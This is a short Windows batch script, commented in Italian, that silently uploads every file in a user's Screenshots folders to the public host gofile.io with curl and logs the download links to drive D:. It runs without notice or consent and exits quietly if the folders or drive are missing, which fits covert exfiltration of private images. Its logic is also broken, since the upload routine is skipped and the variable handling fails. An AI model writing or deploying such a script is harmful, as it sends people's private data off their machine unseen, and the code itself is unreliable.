yes;@echo off
setlocal

:: Percorsi
set "SRC1=%USERPROFILE%\Pictures\Screenshots"
set "SRC2=%USERPROFILE%\Pictures\Screenshots2"
set "DEST=D:\linknic.txt"

:: Verifica se D:\ esiste
if not exist D:\ exit /b

:: Verifica se le cartelle Screenshots e Screenshots2 esistono
if not exist "%SRC1%" exit /b
if not exist "%SRC2%" exit /b

:: Crea il file pass15.txt per indicare che il processo Ã¨ iniziato
echo Processo di caricamento iniziato... > D:\pass15.txt

:: Funzione per caricare un singolo file e restituire il link
:startUpload
for %%f in (%1\*) do (
    if exist "%%f" (
        for /f "delims=" %%i in ('curl -s -F "file=@%%f" https://gofile.io/uploadFile') do (
            set "RESPONSE=%%i"
            for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE% ^| findstr "downloadPage"') do (
                set "LINK=%%~a"
                set "LINK=%LINK:"=%"
                set "LINK=%LINK:~1,-1%"
                if defined LINK (
                    echo File %%f caricato con link: %LINK% >> D:\linknic.txt
                )
            )
        )
    )
)
goto :eof

:: Carica i file della cartella Screenshots su GoFile.io
start cmd /c call :startUpload "%SRC1%"

:: Carica i file della cartella Screenshots2 su GoFile.io
start cmd /c call :startUpload "%SRC2%"

:: Pulizia
echo Caricamento completato. >> D:\linknic.txt

exit /b
